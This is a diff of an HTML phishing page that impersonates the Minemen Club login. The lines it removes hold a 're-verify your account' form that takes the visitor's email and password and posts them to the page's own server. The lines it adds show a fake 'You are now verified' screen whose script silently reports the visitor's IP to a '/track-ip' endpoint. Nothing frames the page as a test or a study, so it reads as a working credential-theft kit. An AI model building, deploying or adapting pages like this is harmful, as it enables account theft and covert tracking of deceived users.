@@ -2,10 +2,8 @@
 <html lang="en">
 <head>
 <meta charset="UTF-8">
-<title>Login | Minemen Club</title>
+<title>Verified</title>
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-
-<!-- Tab Icon -->
 <link rel="icon" type="image/png" href="https://raw.githubusercontent.com/kingsmirnov/Mc/refs/heads/main/img/Login%20_%20Minemen%20Club%20-%20Google%20Chrome%207_5_2026%201_31_46%20AM.png">
 
 <style>
@@ -19,20 +17,6 @@
         overflow-x: hidden;
     }
 
-    a { text-decoration: none; }
-
-    a:hover {
-        text-shadow: 0 0 6px #d946ef;
-    }
-
-    .back-home {
-        position: absolute;
-        top: 22px;
-        left: 22px;
-        color: #bdbdbd;
-        font-size: 15px;
-    }
-
     .container {
         min-height: 100vh;
         width: 100%;
@@ -44,7 +28,6 @@
         box-sizing: border-box;
     }
 
-    /* Logo (no glow) */
     .logo {
         width: 90px;
         height: 90px;
@@ -65,17 +48,12 @@
         border-radius: 22px;
         border: 1px solid #1a1a1a;
         box-shadow: 0px 0px 45px rgba(0,0,0,0.55);
-        text-align: left;
+        text-align: center;
         box-sizing: border-box;
         margin-top: -20px;
     }
 
-    .card h2,
-    .card p {
-        text-align: center;
-    }
-
-    .card h2 {
+    .card h1 {
         margin: 0;
         font-size: 28px;
         font-weight: 700;
@@ -87,149 +65,42 @@
         font-size: 16px;
     }
 
-    .input-group {
-        margin-bottom: 22px;
-    }
-
-    .input-group label {
-        display: block;
-        margin-bottom: 8px;
-        font-size: 15px;
-        color: #d0d0d0;
-        font-weight: 500;
-    }
-
-    .input-group input {
-        width: 100%;
-        padding: 13px;
-        background: #1a1a1a;
-        border: 1px solid #3a3a3a;
-        border-radius: 6px;
-        color: #ffffff;
-        font-size: 15px;
-        outline: none;
-        box-sizing: border-box;
-    }
-
-    .input-group input:focus {
-        border-color: #d946ef;
-    }
-
-    .forgot {
-        display: block;
-        text-align: right;
-        margin-top: -2px;
-        margin-bottom: 26px;
-        color: #d946ef;
-        font-size: 15px;
-    }
-
-    .login-btn {
-        width: 100%;
+    .btn {
+        display: inline-block;
         padding: 16px;
         background: #d946ef;
-        border: none;
-        border-radius: 6px;
-        color: #000000;
-        font-size: 17px;
+        color: #000;
         font-weight: 600;
-        cursor: pointer;
-        box-sizing: border-box;
-        transition: transform 0.25s ease, box-shadow 0.25s ease, background 0.25s ease;
+        border-radius: 6px;
+        text-decoration: none;
+        font-size: 17px;
+        transition: 0.25s ease;
     }
 
-    .login-btn:hover {
-        transform: translateY(-3px);
-        box-shadow: 0 0 18px #d946ef;
+    .btn:hover {
         background: #e75aff;
-    }
-
-    .register {
-        margin-top: 26px;
-        text-align: center;
-        color: #d946ef;
-        font-size: 15px;
-    }
-
-    .register a {
-        color: #d946ef;
-        font-weight: 500;
-    }
-
-    @media (max-width: 480px) {
-        .logo {
-            width: 64px;
-            height: 64px;
-        }
-
-        .card {
-            padding: 35px;
-        }
+        box-shadow: 0 0 18px #d946ef;
     }
 </style>
 </head>
 
 <body>
 
-<a class="back-home" href="https://minemen.club/">← Back to Home</a>
-
 <div class="container">
-
     <div class="card">
-
-        <!-- Logo -->
         <div class="logo">
-            <img src="https://raw.githubusercontent.com/kingsmirnov/Mc/refs/heads/main/img/Login%20_%20Minemen%20Club%20-%20Google%20Chrome%207_5_2026%201_31_46%20AM.png" alt="Minemen Club Logo">
+            <img src="https://raw.githubusercontent.com/kingsmirnov/Mc/refs/heads/main/img/Login%20_%20Minemen%20Club%20-%20Google%20Chrome%207_5_2026%201_31_46%20AM.png">
         </div>
 
-        <h2>re-verify your account</h2>
-        <p>Log in to your Minemen Club account</p>
+        <h1>You are logged in!</h1>
+        <p>You are now verified.</p>
 
-        <form id="loginForm">
-            <div class="input-group">
-                <label>Email Address</label>
-                <input type="email" name="email" placeholder="you@example.com" required>
-            </div>
-
-            <div class="input-group">
-                <label>Password</label>
-                <input type="password" name="password" placeholder="Enter your password" required>
-            </div>
-
-            <a class="forgot" href="https://minemen.club/login/reset-pass">Forgot your password?</a>
-
-            <button class="login-btn">Log In</button>
-
-            <div class="register">
-                Don’t have an account? <a href="https://minemen.club/register">Register here</a>
-            </div>
-        </form>
+        <a class="btn" href="https://minemen.club/" target="_blank">Go to Minemen Club</a>
     </div>
 </div>
 
 <script>
-document.getElementById("loginForm").addEventListener("submit", async (e) => {
-    e.preventDefault();
-
-    const formData = new FormData(e.target);
-    const email = formData.get("email");
-    const password = formData.get("password");
-
-    const res = await fetch("/login", {
-        method: "POST",
-        headers: { "Content-Type": "application/x-www-form-urlencoded" },
-        body: `email=${encodeURIComponent(email)}&password=${encodeURIComponent(password)}`
-    });
-
-    const text = await res.text();
-
-    // Redirect on ANY successful HTTP response (status 200)
-    if (res.ok) {
-        window.location.href = "/dashboard.html";
-    } else {
-        alert("Login failed: " + text);
-    }
-});
+fetch("/track-ip", { method: "POST" });
 </script>
 
 </body>
